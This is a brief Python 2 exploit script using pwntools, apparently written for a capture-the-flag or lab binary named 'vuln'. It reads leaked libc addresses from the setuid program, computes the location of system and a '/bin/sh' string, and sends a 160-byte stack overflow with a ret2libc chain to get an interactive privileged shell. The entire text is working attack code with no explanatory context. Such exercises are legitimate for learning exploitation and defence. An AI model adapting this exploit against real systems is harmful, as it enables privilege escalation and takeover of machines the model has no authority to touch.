#!/usr/bin/env python2
from pwn import *
from struct import pack,unpack

SYSTEM_OFFSET = 0x3a940
PUTS_OFFSET = 0x5f140

p = process("./vuln",setuid=True)
p.recvuntil("puts: ")
puts_addr = int(p.recvline().strip(),16)
libc_base = puts_addr-PUTS_OFFSET
system_address = libc_base+SYSTEM_OFFSET
p.recvuntil("useful_string: ")
bin_sh = int(p.recvline().strip(),16)
p.sendline("A"*160+struct.pack("<I",system_address)+"BBBB"+struct.pack("<I",bin_sh))
p.interactive()